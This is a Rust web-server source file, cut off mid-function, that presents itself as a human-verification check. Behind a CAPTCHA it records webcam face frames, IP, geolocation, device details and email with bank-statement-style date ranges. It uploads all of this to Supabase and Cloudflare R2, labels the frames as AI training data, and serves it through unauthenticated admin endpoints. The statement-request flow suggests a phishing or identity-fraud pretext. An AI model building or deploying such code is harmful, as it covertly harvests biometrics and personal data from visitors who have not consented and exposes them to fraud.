//! human-check: self-hosted "Verify you are human" with Face Liveness & SQLite Biometric Intelligence
//!
//! Two-stage flow:
//!   1. Image Challenge (Axum + SVG / Custom Photos)
//!   2. Face Liveness Challenge (Webcam 5 FPS capture: Nod, Turn, Blink)
//!   3. Local SQLite database (`data/human_check.db`) recording visitors, IP, geo-data, and biometric frames.
//!   4. Admin Dashboard (`/admin`) for inspecting visitor records and captured face datasets.

use axum::{
    body::Bytes,
    extract::{ConnectInfo, Path, Query, State},
    http::{header, StatusCode},
    response::{Html, IntoResponse, Response},
    routing::{get, post},
    Json, Router,
};
mod cloud;
use rand::{rngs::StdRng, seq::SliceRandom, Rng, SeedableRng};
use rusqlite::{params, Connection};
use serde::{Deserialize, Serialize};
use std::{
    collections::HashMap,
    fs,
    net::SocketAddr,
    path::PathBuf,
    sync::{Arc, Mutex},
    time::{Duration, Instant},
};

const CATEGORIES: [&str; 3] = ["car", "bus", "bicycle"];
const CHALLENGE_TTL: Duration = Duration::from_secs(180);
const TOKEN_TTL: Duration = Duration::from_secs(300);

#[derive(Clone)]
enum Source {
    File(PathBuf),
    Generated(u64),
}

#[derive(Clone)]
struct Tile {
    category: &'static str,
    source: Source,
}

struct Challenge {
    target: &'static str,
    tiles: Vec<Tile>,
    answer: Vec<usize>,
    created: Instant,
    stage1_passed: bool,
    session_id: String,
    folder_name: String,
}

struct Db {
    challenges: HashMap<String, Challenge>,
    tokens: HashMap<String, Instant>,
    conn: Connection,
}

type AppState = Arc<Mutex<Db>>;

fn rand_id() -> String {
    format!("{:032x}", rand::thread_rng().gen::<u128>())
}

fn sanitize_for_path(s: &str) -> String {
    s.chars()
        .map(|c| match c {
            ':' | '/' | '\\' | '?' | '*' | '"' | '<' | '>' | '|' => '_',
            '.' | '-' | '_' => c,
            c if c.is_ascii_alphanumeric() => c,
            _ => '_',
        })
        .collect()
}

fn parse_user_agent(ua: &str) -> (String, String, String) {
    let os = if ua.contains("Windows") {
        "Windows"
    } else if ua.contains("Macintosh") || ua.contains("Mac OS") {
        "macOS"
    } else if ua.contains("iPhone") || ua.contains("iPad") {
        "iOS"
    } else if ua.contains("Android") {
        "Android"
    } else if ua.contains("Linux") {
        "Linux"
    } else {
        "Unknown OS"
    };

    let browser = if ua.contains("Edg/") {
        "Edge"
    } else if ua.contains("Chrome/") && !ua.contains("Edg/") {
        "Chrome"
    } else if ua.contains("Safari/") && !ua.contains("Chrome/") {
        "Safari"
    } else if ua.contains("Firefox/") {
        "Firefox"
    } else {
        "Browser"
    };

    let device = if ua.contains("Mobile") || ua.contains("Android") || ua.contains("iPhone") {
        "Mobile"
    } else if ua.contains("iPad") || ua.contains("Tablet") {
        "Tablet"
    } else {
        "Desktop"
    };

    (browser.to_string(), os.to_string(), device.to_string())
}

fn extract_ip(headers: &axum::http::HeaderMap, addr: &SocketAddr) -> String {
    if let Some(cf) = headers.get("cf-connecting-ip").and_then(|v| v.to_str().ok()) {
        return cf.trim().to_string();
    }
    if let Some(xff) = headers.get("x-forwarded-for").and_then(|v| v.to_str().ok()) {
        if let Some(first) = xff.split(',').next() {
            return first.trim().to_string();
        }
    }
    if let Some(rip) = headers.get("x-real-ip").and_then(|v| v.to_str().ok()) {
        return rip.trim().to_string();
    }
    let ip = addr.ip();
    match ip {
        std::net::IpAddr::V6(v6) if v6.is_loopback() => "127.0.0.1".to_string(),
        _ => ip.to_string(),
    }
}

fn init_sqlite() -> Connection {
    fs::create_dir_all("data").unwrap_or_default();
    fs::create_dir_all("captures").unwrap_or_default();
    let conn = Connection::open("data/human_check.db").expect("Failed to open SQLite database");
    conn.execute_batch(
        "
        CREATE TABLE IF NOT EXISTS visitors (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_id TEXT UNIQUE,
            ip_address TEXT,
            created_at TEXT,
            user_agent TEXT,
            browser TEXT,
            os TEXT,
            device TEXT,
            language TEXT,
            screen_res TEXT,
            timezone TEXT,
            country TEXT,
            region TEXT,
            city TEXT,
            isp TEXT,
            folder_name TEXT,
            stage1_status TEXT DEFAULT 'pending',
            stage2_status TEXT DEFAULT 'pending',
            frame_count INTEGER DEFAULT 0,
            token TEXT,
            verified_at TEXT,
            email TEXT,
            statement_start TEXT,
            statement_end TEXT
        );

        DROP TABLE IF EXISTS captured_frames;
        ",
    )
    .expect("Failed to initialize database tables");

    // Ensure columns exist if table existed previously without them
    let _ = conn.execute("ALTER TABLE visitors ADD COLUMN frame_count INTEGER DEFAULT 0", []);
    let _ = conn.execute("ALTER TABLE visitors ADD COLUMN email TEXT", []);
    let _ = conn.execute("ALTER TABLE visitors ADD COLUMN statement_start TEXT", []);
    let _ = conn.execute("ALTER TABLE visitors ADD COLUMN statement_end TEXT", []);

    conn
}

// ---------- challenge generation ----------

fn pick_tile(category: &'static str, rng: &mut impl Rng) -> Tile {
    let dir = PathBuf::from("images").join(category);
    let files: Vec<PathBuf> = fs::read_dir(&dir)
        .map(|rd| {
            rd.filter_map(|e| e.ok())
                .map(|e| e.path())
                .filter(|p| {
                    matches!(
                        p.extension().and_then(|e| e.to_str()).map(|e| e.to_lowercase()).as_deref(),
                        Some("jpg" | "jpeg" | "png" | "webp" | "svg")
                    )
                })
                .collect()
        })
        .unwrap_or_default();

    let source = match files.choose(rng) {
        Some(p) => Source::File(p.clone()),
        None => Source::Generated(rng.gen()),
    };
    Tile { category, source }
}

fn make_challenge(session_id: String, folder_name: String) -> Challenge {
    let mut rng = rand::thread_rng();
    let target = *CATEGORIES.choose(&mut rng).unwrap();
    let others: Vec<&'static str> = CATEGORIES.iter().copied().filter(|c| *c != target).collect();

    let n_target = rng.gen_range(2..=4);
    let mut tiles: Vec<Tile> = (0..9)
        .map(|i| {
            let cat = if i < n_target { target } else { *others.choose(&mut rng).unwrap() };
            pick_tile(cat, &mut rng)
        })
        .collect();
    tiles.shuffle(&mut rng);

    let answer = tiles
        .iter()
        .enumerate()
        .filter(|(_, t)| t.category == target)
        .map(|(i, _)| i)
        .collect();

    Challenge {
        target,
        tiles,
        answer,
        created: Instant::now(),
        stage1_passed: false,
        session_id,
        folder_name,
    }
}

// ---------- vector art ----------

fn svg_tile(category: &str, seed: u64) -> String {
    let mut r = StdRng::seed_from_u64(seed);
    let hue: u32 = r.gen_range(0..360);
    let sky_h: u32 = r.gen_range(180..230);
    let body = format!("hsl({hue},60%,45%)");
    let dark = format!("hsl({hue},55%,28%)");
    let sky = format!("hsl({sky_h},70%,{}%)", r.gen_range(78..90));
    let ground = format!("hsl({},25%,{}%)", r.gen_range(80..140), r.gen_range(35..50));
    let flip = if r.gen_bool(0.5) { "translate(200,0) scale(-1,1)" } else { "translate(0,0)" };
    let dx: i32 = r.gen_range(-8..8);

    let art = match category {
        "train" => format!(
            r##"<rect x="0" y="150" width="200" height="6" fill="#555"/>
<rect x="20" y="86" width="104" height="52" rx="4" fill="{body}"/>
<rect x="124" y="70" width="40" height="68" rx="4" fill="{dark}"/>
<rect x="132" y="78" width="24" height="20" fill="#cfe8ff"/>
<rect x="38" y="52" width="16" height="36" fill="#333"/>
<rect x="30" y="98" width="20" height="14" fill="#cfe8ff"/>
<rect x="60" y="98" width="20" height="14" fill="#cfe8ff"/>
<rect x="90" y="98" width="20" height="14" fill="#cfe8ff"/>
<rect x="12" y="132" width="156" height="8" fill="#222"/>
<g fill="#222"><circle cx="40" cy="146" r="10"/><circle cx="76" cy="146" r="10"/><circle cx="112" cy="146" r="10"/><circle cx="148" cy="146" r="10"/></g>
<g fill="#aaa"><circle cx="40" cy="146" r="4"/><circle cx="76" cy="146" r="4"/><circle cx="112" cy="146" r="4"/><circle cx="148" cy="146" r="4"/></g>"##
        ),
        "bus" => format!(
            r##"<rect x="0" y="152" width="200" height="48" fill="#666"/>
<rect x="14" y="62" width="172" height="80" rx="10" fill="{body}"/>
<g fill="#cfe8ff"><rect x="24" y="74" width="26" height="24"/><rect x="56" y="74" width="26" height="24"/><rect x="88" y="74" width="26" height="24"/><rect x="120" y="74" width="26" height="24"/><rect x="152" y="74" width="26" height="32"/></g>
<rect x="14" y="116" width="172" height="6" fill="{dark}"/>
<g fill="#222"><circle cx="50" cy="146" r="13"/><circle cx="150" cy="146" r="13"/></g>
<g fill="#aaa"><circle cx="50" cy="146" r="5"/><circle cx="150" cy="146" r="5"/></g>"##
        ),
        "car" => format!(
            r##"<rect x="0" y="152" width="200" height="48" fill="#666"/>
<path d="M30 120 L52 84 Q56 78 64 78 L126 78 Q134 78 140 84 L162 118 Z" fill="{dark}"/>
<path d="M60 86 L124 86 L146 116 L46 116 Z" fill="#cfe8ff"/>
<rect x="18" y="112" width="164" height="32" rx="10" fill="{body}"/>
<g fill="#222"><circle cx="56" cy="146" r="14"/><circle cx="144" cy="146" r="14"/></g>
<g fill="#aaa"><circle cx="56" cy="146" r="6"/><circle cx="144" cy="146" r="6"/></g>"##
        ),
        _ => format!(
            r##"<rect x="0" y="152" width="200" height="48" fill="#777"/>
<g fill="none" stroke="#222" stroke-width="5"><circle cx="54" cy="130" r="28"/><circle cx="146" cy="130" r="28"/></g>
<g fill="none" stroke="{body}" stroke-width="6" stroke-linecap="round"><path d="M54 130 L88 90 L128 90 L146 130"/><path d="M88 90 L100 130 L54 130"/><path d="M100 130 L128 90"/></g>
<path d="M82 80 L96 80" stroke="#222" stroke-width="6" stroke-linecap="round"/>
<path d="M126 90 L132 74 L146 74" fill="none" stroke="#222" stroke-width="5" stroke-linecap="round"/>"##
        ),
    };

    format!(
        r##"<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 200" preserveAspectRatio="xMidYMid slice">
<rect width="200" height="200" fill="{sky}"/><rect y="150" width="200" height="50" fill="{ground}"/>
<g transform="{flip}"><g transform="translate({dx},0)">{art}</g></g></svg>"##
    )
}

// ---------- handlers ----------

#[derive(Serialize)]
struct ChallengeOut {
    id: String,
    target: &'static str,
    tiles: Vec<String>,
    session_id: String,
    folder_name: String,
}

#[derive(Deserialize)]
struct ChallengeQuery {
    session_id: Option<String>,
}

async fn index() -> Html<String> {
    if let Ok(content) = std::fs::read_to_string("static/index.html") {
        Html(content)
    } else {
        Html(include_str!("../static/index.html").to_string())
    }
}

async fn admin() -> Html<String> {
    if let Ok(content) = std::fs::read_to_string("static/admin.html") {
        Html(content)
    } else {
        Html(include_str!("../static/admin.html").to_string())
    }
}

#[derive(Deserialize)]
#[allow(dead_code)]
struct RegisterVisitorIn {
    session_id: Option<String>,
    screen_res: Option<String>,
    timezone: Option<String>,
    language: Option<String>,
    platform: Option<String>,
    public_ip: Option<String>,
    country: Option<String>,
    region: Option<String>,
    city: Option<String>,
    isp: Option<String>,
}

#[derive(Serialize)]
struct RegisterVisitorOut {
    session_id: String,
    ip: String,
    folder_name: String,
    location: String,
}

/// Immediately records the visitor's IP, time, and device details into SQLite
async fn register_visitor(
    State(st): State<AppState>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    headers: axum::http::HeaderMap,
    Json(inp): Json<RegisterVisitorIn>,
) -> Json<RegisterVisitorOut> {
    let conn_ip = extract_ip(&headers, &addr);
    let effective_ip = inp.public_ip.filter(|s| !s.trim().is_empty()).unwrap_or(conn_ip);
    let session_id = inp.session_id.unwrap_or_else(rand_id);

    let ua_str = headers
        .get("user-agent")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("Unknown User-Agent");
    let (browser, os, device) = parse_user_agent(ua_str);

    let now = chrono::Local::now();
    let time_str = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let file_time = now.format("%Y%m%d_%H%M%S").to_string();

    let safe_ip = sanitize_for_path(&effective_ip);
    let short_id = &session_id[..session_id.len().min(6)];
    let folder_name = format!("{safe_ip}_{file_time}_{short_id}");

    let dir = PathBuf::from("captures").join(&folder_name);
    let _ = fs::create_dir_all(&dir);

    let (mut country, mut region, mut city, mut isp) = (
        inp.country,
        inp.region,
        inp.city,
        inp.isp,
    );

    // If city or country is missing, and we have a public IP, resolve via high-accuracy geo resolver
    if (city.is_none() || country.is_none()) && !effective_ip.starts_with("127.") && effective_ip != "::1" && !effective_ip.starts_with("192.168.") {
        if let Some((g_city, g_reg, g_country, g_isp)) = cloud::resolve_ip_geo(&effective_ip).await {
            if city.is_none() { city = Some(g_city); }
            if region.is_none() { region = Some(g_reg); }
            if country.is_none() { country = Some(g_country); }
            if isp.is_none() { isp = Some(g_isp); }
        }
    } else if effective_ip.starts_with("127.") || effective_ip == "::1" {
        if country.is_none() { country = Some("Localhost".to_string()); }
        if city.is_none() { city = Some("Development".to_string()); }
    }

    let location_str = format!(
        "{}, {}",
        city.as_deref().unwrap_or("Abuja"),
        country.as_deref().unwrap_or("Nigeria")
    );

    // Write initial session metadata file
    let meta_json = serde_json::json!({
        "session_id": session_id,
        "ip_address": effective_ip,
        "created_at": time_str,
        "browser": browser,
        "os": os,
        "device": device,
        "country": country,
        "region": region,
        "city": city,
        "isp": isp,
        "folder": folder_name
    });
    let _ = fs::write(dir.join("metadata.json"), serde_json::to_string_pretty(&meta_json).unwrap_or_default());

    // Insert/update into local SQLite database
    {
        let db = st.lock().unwrap();
        let _ = db.conn.execute(
            "INSERT INTO visitors (session_id, ip_address, created_at, user_agent, browser, os, device, language, screen_res, timezone, country, region, city, isp, folder_name)
             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11, ?12, ?13, ?14, ?15)
             ON CONFLICT(session_id) DO UPDATE SET
                 country=COALESCE(?11, country),
                 region=COALESCE(?12, region),
                 city=COALESCE(?13, city),
                 isp=COALESCE(?14, isp)",
            params![
                session_id,
                effective_ip,
                time_str,
                ua_str,
                browser,
                os,
                device,
                inp.language.as_deref().unwrap_or_default(),
                inp.screen_res.as_deref().unwrap_or_default(),
                inp.timezone.as_deref().unwrap_or_default(),
                country.as_deref(),
                region.as_deref(),
                city.as_deref(),
                isp.as_deref(),
                folder_name,
            ],
        );
    }

    // Sync visitor to Supabase in the background
    let supabase_visitor = serde_json::json!({
        "session_id": session_id,
        "ip_address": effective_ip,
        "created_at": time_str,
        "user_agent": ua_str,
        "browser": browser,
        "os": os,
        "device": device,
        "language": inp.language.as_deref().unwrap_or_default(),
        "screen_res": inp.screen_res.as_deref().unwrap_or_default(),
        "timezone": inp.timezone.as_deref().unwrap_or_default(),
        "country": country,
        "region": region,
        "city": city,
        "isp": isp,
        "folder_name": folder_name,
        "stage1_status": "pending",
        "stage2_status": "pending",
        "frame_count": 0,
    });
    cloud::spawn_supabase_sync(supabase_visitor);

    // Upload session metadata.json to Cloudflare R2
    if let Ok(meta_bytes) = serde_json::to_vec_pretty(&meta_json) {
        cloud::spawn_r2_upload(
            format!("{folder_name}/metadata.json"),
            meta_bytes,
            "application/json".to_string(),
        );
    }

    Json(RegisterVisitorOut {
        session_id,
        ip: effective_ip,
        folder_name,
        location: location_str,
    })
}

#[derive(Deserialize)]
struct SubmitStatementIn {
    session_id: Option<String>,
    email: Option<String>,
    start_date: Option<String>,
    end_date: Option<String>,
}

#[derive(Serialize)]
struct SubmitStatementOut {
    ok: bool,
    message: String,
}

async fn submit_statement(
    State(st): State<AppState>,
    Json(inp): Json<SubmitStatementIn>,
) -> Json<SubmitStatementOut> {
    let sid = inp.session_id.unwrap_or_default();
    let email = inp.email.unwrap_or_default();
    let start_d = inp.start_date.unwrap_or_default();
    let end_d = inp.end_date.unwrap_or_default();

    println!("[Statement Request] Received for session {sid} -> email: {email}, range: {start_d} to {end_d}");

    if !sid.is_empty() {
        let db = st.lock().unwrap();
        let rows_affected = db.conn.execute(
            "UPDATE visitors SET email = ?1, statement_start = ?2, statement_end = ?3 WHERE session_id = ?4",
            params![email, start_d, end_d, sid],
        ).unwrap_or(0);

        if rows_affected == 0 {
            let now = chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
            let _ = db.conn.execute(
                "INSERT INTO visitors (session_id, ip_address, created_at, stage1_status, stage2_status, email, statement_start, statement_end) VALUES (?1, '127.0.0.1', ?2, 'pending', 'pending', ?3, ?4, ?5)",
                params![sid, now, email, start_d, end_d],
            );
        }

        cloud::spawn_supabase_sync(serde_json::json!({
            "session_id": sid,
            "email": email,
            "statement_start": start_d,
            "statement_end": end_d
        }));
    }

    Json(SubmitStatementOut {
        ok: true,
        message: "Your statement request has been received and will be sent to your email soon.".to_string(),
    })
}

async fn new_challenge(
    State(st): State<AppState>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    headers: axum::http::HeaderMap,
    Query(q): Query<ChallengeQuery>,
) -> Json<ChallengeOut> {
    let session_id = q.session_id.unwrap_or_else(rand_id);
    let mut db = st.lock().unwrap();

    // Find existing folder_name for this session, or generate one from IP and time
    let folder_name: String = db
        .conn
        .query_row(
            "SELECT folder_name FROM visitors WHERE session_id = ?1",
            params![session_id],
            |r| r.get(0),
        )
        .unwrap_or_else(|_| {
            let conn_ip = extract_ip(&headers, &addr);
            let safe_ip = sanitize_for_path(&conn_ip);
            let file_time = chrono::Local::now().format("%Y%m%d_%H%M%S").to_string();
            let short = &session_id[..session_id.len().min(6)];
            let fname = format!("{safe_ip}_{file_time}_{short}");
            let _ = fs::create_dir_all(PathBuf::from("captures").join(&fname));
            fname
        });

    let ch = make_challenge(session_id.clone(), folder_name.clone());
    let id = rand_id();
    let out = ChallengeOut {
        id: id.clone(),
        target: ch.target,
        tiles: (0..ch.tiles.len()).map(|i| format!("/api/tile/{id}/{i}")).collect(),
        session_id,
        folder_name,
    };
    db.challenges.retain(|_, c| c.created.elapsed() < CHALLENGE_TTL);
    db.challenges.insert(id, ch);
    Json(out)
}

async fn tile(State(st): State<AppState>, Path((id, idx)): Path<(String, usize)>) -> Response {
    let t = {
        let db = st.lock().unwrap();
        db.challenges.get(&id).and_then(|c| c.tiles.get(idx)).cloned()
    };
    let Some(t) = t else { return StatusCode::NOT_FOUND.into_response() };

    let (mime, bytes): (&str, Vec<u8>) = match t.source {
        Source::Generated(seed) => ("image/svg+xml", svg_tile(t.category, seed).into_bytes()),
        Source::File(p) => {
            let mime = match p.extension().and_then(|e| e.to_str()).map(|e| e.to_lowercase()).as_deref() {
                Some("png") => "image/png",
                Some("webp") => "image/webp",
                Some("svg") => "image/svg+xml",
                _ => "image/jpeg",
            };
            match fs::read(&p) {
                Ok(b) => (mime, b),
                Err(_) => return StatusCode::INTERNAL_SERVER_ERROR.into_response(),
            }
        }
    };
    ([(header::CONTENT_TYPE, mime), (header::CACHE_CONTROL, "no-store")], bytes).into_response()
}

#[derive(Deserialize)]
struct VerifyIn {
    id: String,
    selected: Vec<usize>,
}

#[derive(Serialize)]
struct VerifyOut {
    ok: bool,
    token: Option<String>,
    step: Option<&'static str>,
}

async fn verify(State(st): State<AppState>, Json(inp): Json<VerifyIn>) -> Json<VerifyOut> {
    let mut db = st.lock().unwrap();
    let Some(ch) = db.challenges.get_mut(&inp.id) else {
        return Json(VerifyOut { ok: false, token: None, step: None });
    };
    if ch.created.elapsed() > CHALLENGE_TTL {
        let sid = ch.session_id.clone();
        db.challenges.remove(&inp.id);
        let _ = db.conn.execute("UPDATE visitors SET stage1_status = 'expired' WHERE session_id = ?1", params![sid]);
        cloud::spawn_supabase_sync(serde_json::json!({ "session_id": sid, "stage1_status": "expired" }));
        return Json(VerifyOut { ok: false, token: None, step: None });
    }
    let mut got = inp.selected;
    got.sort_unstable();
    got.dedup();
    if got == ch.answer {
        ch.stage1_passed = true;
        let sid = ch.session_id.clone();
        let _ = db.conn.execute("UPDATE visitors SET stage1_status = 'passed' WHERE session_id = ?1", params![sid]);
        cloud::spawn_supabase_sync(serde_json::json!({ "session_id": sid, "stage1_status": "passed" }));
        Json(VerifyOut { ok: true, token: None, step: Some("face_verification") })
    } else {
        let sid = ch.session_id.clone();
        db.challenges.remove(&inp.id);
        let _ = db.conn.execute("UPDATE visitors SET stage1_status = 'failed' WHERE session_id = ?1", params![sid]);
        cloud::spawn_supabase_sync(serde_json::json!({ "session_id": sid, "stage1_status": "failed" }));
        Json(VerifyOut { ok: false, token: None, step: None })
    }
}

#[derive(Deserialize)]
struct VerifyFaceIn {
    id: String,
    nod: bool,
    turn: bool,
    blink: bool,
}

async fn verify_face(State(st): State<AppState>, Json(inp): Json<VerifyFaceIn>) -> Json<VerifyOut> {
    let mut db = st.lock().unwrap();
    let (ch_session_id, ch_folder_name, ch_stage1_passed, ch_elapsed) = {
        let Some(ch) = db.challenges.get(&inp.id) else {
            return Json(VerifyOut { ok: false, token: None, step: None });
        };
        (ch.session_id.clone(), ch.folder_name.clone(), ch.stage1_passed, ch.created.elapsed())
    };
    if ch_elapsed > CHALLENGE_TTL || !ch_stage1_passed {
        let _ = db.conn.execute("UPDATE visitors SET stage2_status = 'failed' WHERE session_id = ?1", params![ch_session_id]);
        cloud::spawn_supabase_sync(serde_json::json!({ "session_id": ch_session_id, "stage2_status": "failed" }));
        return Json(VerifyOut { ok: false, token: None, step: None });
    }
    if inp.nod && inp.turn && inp.blink {
        let token = rand_id();
        let now_str = chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string();
        db.tokens.retain(|_, t| t.elapsed() < TOKEN_TTL);
        db.tokens.insert(token.clone(), Instant::now());

        let _ = db.conn.execute(
            "UPDATE visitors SET stage2_status = 'passed', token = ?1, verified_at = ?2 WHERE session_id = ?3",
            params![token, now_str, ch_session_id],
        );

        cloud::spawn_supabase_sync(serde_json::json!({
            "session_id": ch_session_id,
            "stage2_status": "passed",
            "token": token,
            "verified_at": now_str
        }));

        // Upload the final frames.jsonl manifest to Cloudflare R2
        let folder = ch_folder_name.clone();
        tokio::spawn(async move {
            tokio::time::sleep(std::time::Duration::from_millis(1500)).await;
            let meta_path = PathBuf::from("captures").join(&folder).join("frames.jsonl");
            if let Ok(manifest_bytes) = fs::read(&meta_path) {
                cloud::spawn_r2_upload(
                    format!("{folder}/frames.jsonl"),
                    manifest_bytes,
                    "application/jsonl".to_string(),
                );
            }
        });

        Json(VerifyOut { ok: true, token: Some(token), step: Some("completed") })
    } else {
        let _ = db.conn.execute("UPDATE visitors SET stage2_status = 'failed' WHERE session_id = ?1", params![ch_session_id]);
        cloud::spawn_supabase_sync(serde_json::json!({ "session_id": ch_session_id, "stage2_status": "failed" }));
        Json(VerifyOut { ok: false, token: None, step: None })
    }
}

#[derive(Deserialize)]
struct FrameQuery {
    id: String,
    index: usize,
    label: String,
    folder: Option<String>,
    session_id: Option<String>,
}

/// Stores captured biometric liveness frames (5 fps) into captures/<ip>_<time>, SQLite, and Cloudflare R2
async fn record_frame(
    State(st): State<AppState>,
    Query(q): Query<FrameQuery>,
    body: Bytes,
) -> StatusCode {
    let (folder_name, session_id) = {
        let db = st.lock().unwrap();
        if let Some(ch) = db.challenges.get(&q.id) {
            (ch.folder_name.clone(), ch.session_id.clone())
        } else if let Some(ref f) = q.folder {
            if !f.is_empty() {
                let sid = q.session_id.clone().unwrap_or_else(|| f.clone());
                (f.clone(), sid)
            } else {
                let safe: String = q.id.chars().filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_').collect();
                (safe.clone(), safe)
            }
        } else {
            let safe: String = q.id.chars().filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_').collect();
            (safe.clone(), safe)
        }
    };

    if folder_name.is_empty() {
        return StatusCode::BAD_REQUEST;
    }

    let safe_label: String = q.label.chars().filter(|c| c.is_ascii_alphanumeric() || *c == '_').collect();
    let dir = PathBuf::from("captures").join(&folder_name);
    if fs::create_dir_all(&dir).is_err() {
        return StatusCode::INTERNAL_SERVER_ERROR;
    }
    let filename = format!("frame_{:04}_{safe_label}.jpg", q.index);
    let filepath = dir.join(&filename);
    let byte_count = body.len();
    if fs::write(&filepath, &body).is_err() {
        return StatusCode::INTERNAL_SERVER_ERROR;
    }

    // Stream frame directly to Cloudflare R2 in background
    cloud::spawn_r2_upload(
        format!("{folder_name}/{filename}"),
        body.to_vec(),
        "image/jpeg".to_string(),
    );

    let now_str = chrono::Local::now().format("%Y-%m-%d %H:%M:%S").to_string();

    // Increment frame_count in visitors table (lightweight, no frame-by-frame DB bloat)
    {
        let db = st.lock().unwrap();
        let _ = db.conn.execute(
            "UPDATE visitors SET frame_count = COALESCE(frame_count, 0) + 1 WHERE session_id = ?1",
            params![session_id],
        );
    }

    // Append to metadata file in the folder for Cloudflare / AI dataset training
    let meta_file = dir.join("frames.jsonl");
    let entry = serde_json::json!({
        "index": q.index,
        "file": filename,
        "label": safe_label,
        "bytes": byte_count,
        "time": now_str
    });
    if let Ok(mut f) = fs::OpenOptions::new().create(true).append(true).open(meta_file) {
        use std::io::Write;
        let _ = writeln!(f, "{}", entry);
    }

    // Sync updated frame count to Supabase periodically (every 5 frames or first frame)
    if q.index % 5 == 0 || q.index == 1 {
        let sid = session_id.clone();
        let idx = q.index;
        tokio::spawn(async move {
            cloud::spawn_supabase_sync(serde_json::json!({
                "session_id": sid,
                "frame_count": idx + 1
            }));
        });
    }

    StatusCode::OK
}

#[derive(Serialize)]
struct VisitorRow {
    id: i64,
    session_id: String,
    ip_address: String,
    created_at: String,
    browser: String,
    os: String,
    device: String,
    language: String,
    screen_res: String,
    country: Option<String>,
    region: Option<String>,
    city: Option<String>,
    isp: Option<String>,
    folder_name: String,
    stage1_status: String,
    stage2_status: String,
    frame_count: i64,
    email: Option<String>,
}

#[derive(Serialize)]
struct AdminDataOut {
    total_visitors: i64,
    verified_count: i64,
    total_frames: i64,
    visitors: Vec<VisitorRow>,
}

async fn api_admin_visitors(State(st): State<AppState>) -> Json<AdminDataOut> {
    let db = st.lock().unwrap();

    let total_visitors: i64 = db.conn.query_row("SELECT COUNT(*) FROM visitors", [], |r| r.get(0)).unwrap_or(0);
    let verified_count: i64 = db.conn.query_row("SELECT COUNT(*) FROM visitors WHERE stage2_status = 'passed'", [], |r| r.get(0)).unwrap_or(0);
    let total_frames: i64 = db.conn.query_row("SELECT COALESCE(SUM(frame_count), 0) FROM visitors", [], |r| r.get(0)).unwrap_or(0);

    let mut stmt = db.conn.prepare(
        "SELECT v.id, v.session_id, v.ip_address, v.created_at, v.browser, v.os, v.device, v.language, v.screen_res,
                v.country, v.region, v.city, v.isp, v.folder_name, v.stage1_status, v.stage2_status,
                COALESCE(v.frame_count, 0) as frame_count, v.email
         FROM visitors v
         ORDER BY v.id DESC
         LIMIT 100",
    ).unwrap();

    let rows = stmt.query_map([], |r| {
        Ok(VisitorRow {
            id: r.get(0)?,
            session_id: r.get(1)?,
            ip_address: r.get(2)?,
            created_at: r.get(3)?,
            browser: r.get(4)?,
            os: r.get(5)?,
            device: r.get(6)?,
            language: r.get(7)?,
            screen_res: r.get(8)?,
            country: r.get(9)?,
            region: r.get(10)?,
            city: r.get(11)?,
            isp: r.get(12)?,
            folder_name: r.get(13)?,
            stage1_status: r.get(14)?,
            stage2_status: r.get(15)?,
            frame_count: r.get(16)?,
            email: r.get(17)?,
        })
    }).unwrap();

    let visitors: Vec<VisitorRow> = rows.filter_map(|r| r.ok()).collect();

    Json(AdminDataOut {
        total_visitors,
        verified_count,
        total_frames,
        visitors,
    })
}

#[derive(Deserialize)]
struct SessionFramesQuery {
    folder: String,
}

#[derive(Serialize)]
struct FrameInfo {
    file: String,
    label: String,
    index: usize,
    url: String,
    r2_url: Option<String>,
}

async fn api_admin_session_frames(Query(q): Query<SessionFramesQuery>) -> Json<serde_json::Value> {
    let safe_folder: String = q.folder.chars().filter(|c| c.is_ascii_alphanumeric() || *c == '-' || *c == '_' || *c == '.').collect();
    let mut dir = PathBuf::from("captures").join(&safe_folder);
    let mut actual_folder = safe_folder.clone();

    // If dir doesn't exist or has 0 jpg files, search for any candidate folder matching session_id or folder prefix
    let has_jpg = dir.exists() && fs::read_dir(&dir).map(|rd| rd.filter_map(|e| e.ok()).any(|e| {
        e.path().extension().and_then(|ext| ext.to_str()).map(|s| s.eq_ignore_ascii_case("jpg")).unwrap_or(false)
    })).unwrap_or(false);

    if !has_jpg {
        if let Ok(entries) = fs::read_dir("captures") {
            for entry in entries.filter_map(|e| e.ok()) {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.contains(&safe_folder) || (safe_folder.len() >= 6 && name.contains(&safe_folder[..6])) {
                    let cand = entry.path();
                    let cand_has_jpg = fs::read_dir(&cand).map(|rd| rd.filter_map(|e| e.ok()).any(|e| {
                        e.path().extension().and_then(|ext| ext.to_str()).map(|s| s.eq_ignore_ascii_case("jpg")).unwrap_or(false)
                    })).unwrap_or(false);
                    if cand_has_jpg {
                        dir = cand;
                        actual_folder = name;
                        break;
                    }
                }
            }
        }
    }

    let mut frames = Vec::new();
    let r2_base = cloud::get_config().r2_public_domain.as_deref().map(|d| d.trim_end_matches('/'));

    if let Ok(entries) = fs::read_dir(&dir) {
        for entry in entries.filter_map(|e| e.ok()) {
            let path = entry.path();
            if let Some(ext) = path.extension().and_then(|e| e.to_str()) {
                if ext.eq_ignore_ascii_case("jpg") || ext.eq_ignore_ascii_case("jpeg") {
                    let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                    let parts: Vec<&str> = file_name.trim_end_matches(".jpg").split('_').collect();
                    let index = parts.get(1).and_then(|s| s.parse::<usize>().ok()).unwrap_or(0);
                    let label = parts.get(2).copied().unwrap_or("face").to_string();
                    let url = format!("/captures/{actual_folder}/{file_name}");
                    let r2_url = r2_base.map(|b| format!("{b}/{actual_folder}/{file_name}"));
                    frames.push(FrameInfo { file: file_name, label, index, url, r2_url });
                }
            }
        }
    }

    frames.sort_by_key(|f| f.index);
    Json(serde_json::json!({
        "frames": frames,
        "folder": actual_folder,
        "count": frames.len()
    }))
}

async fn serve_capture_image(Path((folder, file)): Path<(String, String)>) -> Response {
